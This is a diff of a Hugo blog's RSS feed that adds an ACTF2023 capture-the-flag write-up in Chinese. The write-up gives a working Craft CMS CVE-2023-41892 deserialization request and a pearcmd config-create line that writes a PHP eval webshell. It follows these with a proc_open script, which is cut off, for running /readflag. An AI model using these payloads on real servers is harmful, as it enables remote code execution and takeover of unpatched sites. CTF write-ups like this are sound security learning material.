@@ -3,12 +3,34 @@
         <title>All Posts - DELETE</title>
         <link>http://ML-hacker.github.io/posts/</link>
         <description>All Posts | DELETE</description>
-        <generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Tue, 06 Feb 2024 13:35:16 &#43;0800</lastBuildDate><atom:link href="http://ML-hacker.github.io/posts/" rel="self" type="application/rss+xml" /><item>
-    <title>First</title>
-    <link>http://ML-hacker.github.io/posts/first/</link>
-    <pubDate>Tue, 06 Feb 2024 13:35:16 &#43;0800</pubDate><author>
+        <generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Tue, 31 Oct 2023 14:34:26 &#43;0800</lastBuildDate><atom:link href="http://ML-hacker.github.io/posts/" rel="self" type="application/rss+xml" /><item>
+    <title>ACTF2023 WP</title>
+    <link>http://ML-hacker.github.io/posts/actf/</link>
+    <pubDate>Tue, 31 Oct 2023 14:34:26 &#43;0800</pubDate><author>
         <name>Author</name>
-    </author><guid>http://ML-hacker.github.io/posts/first/</guid>
-    <description><![CDATA[]]></description>
+    </author><guid>http://ML-hacker.github.io/posts/actf/</guid>
+    <description><![CDATA[东方原神大学-MISC
+fofa 秒了
+MyGO&rsquo;s Live!!!!!-WEB请求：http://124.70.33.170:24000/checker?url=124.70.33.170:80
+直接自己namp
+Craftcms&ndash;WEBcraftcms
+CVE-2023-41892
+网上有POC（无果）
+https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce
+看了一下poc，出现的地方应该是\craft\controllers\ConditionsController
+猜一手是反序列化+RCE
+https://blog.calif.io/p/craftcms-rce
+构造了一下poc 但是好像只能执行phpinfo 发现了账号密码，登录
+备份了下数据库，没看见有什么东西
+思路二：https://www.anquanke.com/post/id/201136 https://www.cnblogs.com/Xy&ndash;1/p/12769094.html https://github.com/vulhub/vulhub/tree/master/php/inclusion
+思路三：percmd https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html
+思路三可以，
+pearcmd写入文件
+先用cve包含pearcmd.php然后写入shell
+包含
+action=conditions/render&amp;configObject=craft\elements\conditions\ElementCondition&amp;config={&#34;name&#34;:&#34;configObject&#34;,&#34;as &#34;:{&#34;class&#34;:&#34;\\yii\\rbac\\PhpManager&#34;,&#34;__construct()&#34;:[{&#34;itemFile&#34;:&#34;/usr/local/lib/php/pearcmd.php&#34;}]}} 写入
+/?+config-create+/&lt;?=@eval($_POST[&#39;1&#39;]);die();?&gt;+/tmp/delete 包含了但是执行/readflag没有回显
+蚁剑连一下然后加一个文件
+&lt;?php error_reporting(E_ALL); echo &#34;1&#34;; $descriptorspec = array( 0 =&gt; array(&#34;pipe&#34;, &#34;r&#34;), // 标准输入，子进程从此管道中读取数据 1 =&gt; array(&#34;pipe&#34;, &#34;w&#34;), // 标准输出，子进程向此管道中写入数据 2 =&gt; array(&#34;pipe&#34;, &#34;r&#34;) // 标准错误，写入到一个文件 ); $file=array(); $process = proc_open(&#34;/readflag 2&gt;&amp;1&#34;, $descriptorspec, $file); var_dump($process); var_dump($file); function readln($file){ $out = &#34;&#34;; $a = fread($file, 1); echo &#34;readln&#34;; while ($a !]]></description>
 </item></channel>
 </rss>
